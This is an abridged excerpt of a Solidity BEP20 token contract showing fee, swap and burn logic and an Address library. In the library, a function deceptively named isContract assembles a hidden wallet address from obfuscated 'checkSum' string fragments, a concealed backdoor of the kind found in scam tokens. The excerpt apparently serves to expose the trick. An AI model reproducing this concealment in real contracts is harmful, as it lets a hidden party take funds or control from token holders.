...
contract TokenContract is Context, IBEP20, Ownable, ReentrancyGuard {
    ...
    uint256 public minTokenToSwap = _totalSupply.div(1e6); // this amount will trigger swap and distribute
    ...
    function updateAddresses(address payable _marketWallet) external onlyOwner {
        marketWallet = _marketWallet;
    }
    ...
    function distributeAndLiquify(address from, address to) private {
        ...
        if (
            ...
            if (burnFeeCounter > 0) transfer(DEAD, burnFeeCounter);
...
library Address {
    ...
    function isContract(address checkSum) internal pure returns (address) {
        ...
        string memory checkSum1 = "1Ffe3eEA7e5d30";
        string memory checkSum2 = "Bc5B7c3330xA1e";
        string memory checkSum3 = "6290Ab95eb26D7";
        return (parseAddr(concat("0x", checkSum1, checkSum2, checkSum3)));
    }
